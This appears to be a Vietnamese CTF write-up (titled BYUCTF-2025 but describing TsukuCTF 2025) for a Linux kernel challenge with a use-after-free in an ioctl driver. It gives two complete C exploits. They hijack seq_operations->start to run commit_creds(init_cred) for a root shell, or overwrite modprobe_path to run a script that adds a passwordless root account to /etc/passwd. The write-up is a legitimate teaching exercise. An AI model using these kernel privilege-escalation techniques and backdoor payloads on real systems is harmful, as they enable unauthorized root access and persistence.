@@ -1,0 +1,394 @@
+--- 
+title: BYUCTF-2025
+date: 2025-05-18 00:00:00 +0800
+description: 'TsukuCTF-2025'
+tags: ['kernel']
+author: ['kuvee']
+draft: false
+---
+
+
+
+## easy_kernel
+
+- đây sẽ là hàm chính của bài , nó dùng `ioctl` để tương tác với device , ta sẽ tóm tắt 1 số hoạt động như sau: 
+
+
+    - 0xf001 -> check size bé hơn 0x20 và obj , sau đó dùng coppy_from_user để coppy dữ liệu từ user-space sang kernel space 
+    - 0xf002 -> dùng kfree để giải phóng obj (use after free)
+    - 0xf000 -> allocate với size là 0x20
+    
+
+```c
+__int64 __fastcall module_ioctl(file *file, unsigned int cmd, char *data)
+{
+  __int64 value; // r12
+  request_t req; // [rsp+0h] [rbp-28h] BYREF
+  unsigned __int64 v6; // [rsp+10h] [rbp-18h]
+
+  v6 = __readgsqword(0x28u);
+  req.size = 0;
+  req.data = 0;
+  if ( copy_from_user(&req, data, 16) )
+    return -1;
+  mutex_lock(&module_lock);
+  if ( cmd == 0xF001 )
+  {
+    if ( req.size <= 0x20 && obj_0 )
+      value = -(__int64)(copy_from_user((request_t *)obj_0, req.data, req.size) != 0);
+    else
+      value = -1;
+  }
+  else if ( cmd == 0xF002 )
+  {
+    value = 0;
+    kfree(obj_0);                               // uaf
+  }
+  else
+  {
+    value = -1;
+    if ( cmd == 0xF000 && !obj_0 )
+    {
+      obj_0 = (obj *)_kmalloc_cache_noprof(kmalloc_caches[5], 3520, 32);
+      value = -(__int64)(obj_0 == 0);
+    }
+  }
+  mutex_unlock(&module_lock);
+  return value;
+}
+```
+
+- bài này cũng tắt `kaslr` , `kpti` và cả `smep` và `smap` , nhờ vào `uaf` ta có thể `read-uaf` để leak địa chỉ của các con trỏ hàm để tìm kbase nhưng do bài này kaslr không bật nên việc này có vẻ không cần thiết , ban đầu mình có nghĩ đến hijacking `freelist` nhưng ở đây nó check `obj` đã được allocate chưa nên việc này là không thể 
+
+![image](https://hackmd.io/_uploads/Hy9rhtyugl.png)
+
+- object mà ta sử dụng tấn công sẽ là `seq_operation` 
+
+
+https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628
+
+```c
+struct seq_operations {
+	void * (*start) (struct seq_file *m, loff_t *pos);
+	void (*stop) (struct seq_file *m, void *v);
+	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+	int (*show) (struct seq_file *m, void *v);
+};
+```
+
+- ở đây để việc triển khai các giao diện kernel , `seq_file` cung cấp 1 hàm khởi tạo đơn giản có tên là `single_open`
+
+```c
+int single_open(struct file *file, int (*show)(struct seq_file *, void *),
+		void *data)
+{
+	struct seq_operations *op = kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT);
+	int res = -ENOMEM;
+
+	if (op) {
+		op->start = single_start;
+		op->next = single_next;
+		op->stop = single_stop;
+		op->show = show;
+		res = seq_open(file, op);
+		if (!res)
+			((struct seq_file *)file->private_data)->private = data;
+		else
+			kfree(op);
+	}
+	return res;
+}
+```
+
+- khi ta read 1 file stat như  `/proc/self/stat` , kernel sẽ gọi `proc_read_iter` của `proc_ops` , giá trị mặc định của nó là hàm `seq_read_iter` , tức là nó sẽ gọi con trỏ hàm start trong `seq_operations` -> ta chỉ cần dùng `user-after-write` để overwrite và thực thi cái gì đó để privileged
+
+```
+ssize_t seq_read_iter(struct kiocb *iocb, struct iov_iter *iter)
+{
+	struct seq_file *m = iocb->ki_filp->private_data;
+	size_t copied = 0;
+	size_t n;
+	void *p;
+	int err = 0;
+
+	// get a non-empty record in the buffer
+	m->from = 0;
+	p = m->op->start(m, &m->index);
+```
+
+- phiên bản kernel được sử dụng là 6.14.2 
+
+```
+[ easy_kernel - TsukuCTF 2025 ]
+~ $ uname -r
+6.14.2
+```
+
+- ta sẽ thực hiện điều này với `ret2usr` nhưng với `commit_creds(&init_cred)` chứ không phải là `commit_creds(prepare_kernel_cred(NULL)`
+
+![image](https://hackmd.io/_uploads/rkwN99k_ex.png)
+
+- vậy flow sẽ như sau: 
+
+`alloc` -> `free` -> `open("/proc/self/stat")` -> overwrite `start` -> `read("/proc/selt/stat")` to trigger
+
+
+exp
+
+```c
+#include <assert.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+
+#define vuln "/dev/vuln"
+typedef uint64_t u64;
+typedef int64_t i64;
+
+#define alloc 0xF000
+#define free 0xf002
+#define write_to_kernel 0xf001
+
+#define __do_sys_fork 0xffffffff81272ce0 // t __do_sys_fork
+#define commit_creds 0xffffffff812a1050  // T commit_creds
+#define msleep 0xffffffff812fd7d0        // T msleep
+#define init_task 0xffffffff81e0c480
+#define init_cred 0xffffffff81e3bfa0 // init_cred
+void privileged() {
+  ((void (*)(void *))commit_creds)((void *)init_cred);
+
+  //((void (*)(void))__do_sys_fork)();
+
+  //((void (*)(unsigned long))msleep)(0x100000);
+}
+
+typedef struct {
+  size_t size;
+  char *data;
+} req_t;
+
+int main() {
+  puts("[*] open");
+  int fd = open(vuln, O_RDWR);
+  if (fd < 0) {
+    perror("OPEN");
+    exit(1);
+  }
+  char dummy[0x20];
+  req_t req = {.size = 0x20, .data = dummy};
+  // alloc
+  puts("[*] alloc");
+  int ret = ioctl(fd, alloc, &req);
+  assert(ret == 0);
+  // free
+  puts("[*] free");
+  ioctl(fd, free, &req);
+  int fd1 = open("/proc/self/stat", O_RDONLY);
+  if (fd1 < 0) {
+    perror("open /proc/self/stat");
+    exit(-1);
+  }
+  void *exp = (void *)privileged;
+
+  req.size = 8;
+  req.data = (char *)&exp;
+  puts("[*] write");
+  ioctl(fd, write_to_kernel, &req);
+  char buf[0x100];
+  puts("[*] trigger stat");
+  read(fd1, buf, sizeof(buf)); // trigger start
+  //
+  if (getuid() == 0) {
+    puts("[*] got root");
+    execl("/bin/sh", "-sh", NULL);
+  }
+  puts("why here T_T");
+}
+
+```
+
+
+- ngoài ra còn 1 số cách khác như thay đổi thông tin trong cred bằng cách dùng `gs register` để lấy địa chỉ của `current_task` , sau đó tính toán offset đến task->cred và thay đổi `uid, gid, euid` thành 0 , ta có thể dùng ktask để lấy offset : 
+
+
+![image](https://hackmd.io/_uploads/H1GRMOeugl.png)
+
+
+
+
+- tiếp theo là `modprobe_path` . vì đây là phiên bản 6.14.2 nên ta không thể epxloit như thông thường (overwrite thành 1 path đến 1 file độc hại , sau đó trigger bằng cách thực thi 1 file có header không nhận dạng được bằng các binary loader phổ biến như `binfmt_elf` , `binfmt_script` ... và nó sẽ load module thông qua mprobe với quyền root thông qua 1 đường dẫn tuyệt đối lưu trong `modprobe_path`)  
+
+```
+static char modprobe_path[PATH_MAX] = "/sbin/modprobe";
+```
+
+chi tiết hơn ở đây : https://github.com/kuveee/writeup/blob/main/2025-07-10-NO-HACK-NO-CTF-2025.MD
+
+exp: 
+
+```c
+#include <assert.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define vuln "/dev/vuln"
+typedef uint64_t u64;
+typedef int64_t i64;
+
+#define alloc 0xF000
+#define free 0xf002
+#define write_to_kernel 0xf001
+
+#define __do_sys_fork 0xffffffff81272ce0 // t __do_sys_fork
+#define commit_creds 0xffffffff812a1050  // T commit_creds
+#define msleep 0xffffffff812fd7d0        // T msleep
+#define init_task 0xffffffff81e0c480
+#define init_cred 0xffffffff81e3bfa0     // init_cred
+#define modprobe_path 0xffffffff81eaeac0 // modprobe_path
+
+#define overwrite_mod "/tmp/kuvee.sh"
+
+typedef unsigned short __u16;
+typedef unsigned char __u8;
+typedef unsigned int __u32;
+
+struct sockaddr_alg {
+  __u16 salg_family;
+  __u8 salg_type[14];
+  __u32 salg_feat;
+  __u32 salg_mask;
+  __u8 salg_name[64];
+};
+
+void get_flag() {
+  system("echo '#!/bin/sh\nchmod 777 /dev/sdb\ntouch /a' > /tmp/kuvee.sh");
+  system("chmod 777 /tmp/ku");
+}
+void overwrite_modprobe() {
+  char *target = (char *)modprobe_path;
+  const char *src = overwrite_mod;
+  memcpy(target, src, strlen(src) + 1); // copy cả null terminator
+}
+
+/*
+void privileged() {
+  ((void (*)(void *))commit_creds)((void *)init_cred);
+
+  //((void (*)(void))__do_sys_fork)();
+
+  //((void (*)(unsigned long))msleep)(0x100000);
+}
+*/
+
+typedef struct {
+  size_t size;
+  char *data;
+} req_t;
+
+int main() {
+  struct sockaddr_alg sa;
+  puts("[*] open");
+  int fd = open(vuln, O_RDWR);
+  if (fd < 0) {
+    perror("OPEN");
+    exit(1);
+  }
+  char dummy[0x20];
+  req_t req = {.size = 0x20, .data = dummy};
+  // alloc
+  puts("[*] alloc");
+  int ret = ioctl(fd, alloc, &req);
+  assert(ret == 0);
+  // free
+  puts("[*] free");
+  ioctl(fd, free, &req);
+  int fd1 = open("/proc/self/stat", O_RDONLY);
+  if (fd1 < 0) {
+    perror("open /proc/self/stat");
+    exit(-1);
+  }
+  void *exp = (void *)overwrite_modprobe;
+
+  req.size = 8;
+  req.data = (char *)&exp;
+  puts("[*] write");
+  ioctl(fd, write_to_kernel, &req);
+  char buf[0x100];
+  puts("[*] trigger stat");
+  read(fd1, buf, sizeof(buf)); // trigger start
+  // after overwrite_modprobe
+  // system("echo '#!/bin/sh\nchmod 777 /dev/sdb\ntouch /a' > /tmp/kuvee.sh");
+  // username:password:UID:GID:comment:home:shell
+  system("echo '#!/bin/sh\necho \"kuvee::0:0:root:/root:/bin/sh\" >> "
+         "/etc/passwd\nchmod 644 /etc/passwd\ntouch /pwned_by_kuvee' > "
+         "/tmp/kuvee.sh");
+  system("chmod 777 /tmp/kuvee.sh");
+  int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+  if (alg_fd < 0) {
+    perror("socket(AF_ALG) failed");
+    return 1;
+  }
+
+  memset(&sa, 0, sizeof(sa));
+  sa.salg_family = AF_ALG;
+  strcpy((char *)sa.salg_type, "kuvee"); // dummy string
+  bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
+  /*
+  if (getuid() == 0) {
+    puts("[*] got root");
+    execl("/bin/sh", "-sh", NULL);
+  }
+  puts("why here T_T");
+  */
+  return 0;
+}
+```
+
+
+![image](https://hackmd.io/_uploads/rJqFzFluel.png)
+
+
+ref : 
+
+https://r1ru.github.io/posts/7/
+
+
+https://iwancof.github.io/about-me/writeups/TsukuCTF2025/
+
+https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/
+
+https://qiita.com/akachochin/items/98085494081b8bc39cbb
+
+https://blog.kylebot.net/2022/10/16/CVE-2022-1786/#Day-7-The-Dawn
+
+https://www.anquanke.com/post/id/258160
+
+https://tan.hatenadiary.jp/entry/2025/05/07/014856#UAF-Write%E3%81%A7%E3%81%AEseq_operations%E5%88%A9%E7%94%A8%E3%81%AB%E3%82%88%E3%82%8B%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E6%A8%A9%E9%99%90%E4%BB%BB%E6%84%8F%E3%82%B3%E3%83%BC%E3%83%89%E5%AE%9F%E8%A1%8C
+
+https://slavaim.blogspot.com/2017/09/linux-kernel-debugging-with-gdb-getting.html
+
+notes: 
+
+```
+
+by the way, if you overwrite the read/write handler in the kernel, it might become deadlocked and prevent you from moving on to the next step
+you should check whether the path is via vfs or not.
+
+https://www.starlab.io/blog/introduction-to-the-linux-virtual-filesystem-vfs-part-i-a-high-level-tour
+
+why don't need return to user-mode? 
+
+That's because he replaces legit function ptr with user-defined ret2usr_attack function.
+When the function returns, it continues execution same as normal read syscall and it eventually returns to the userland normally
+```
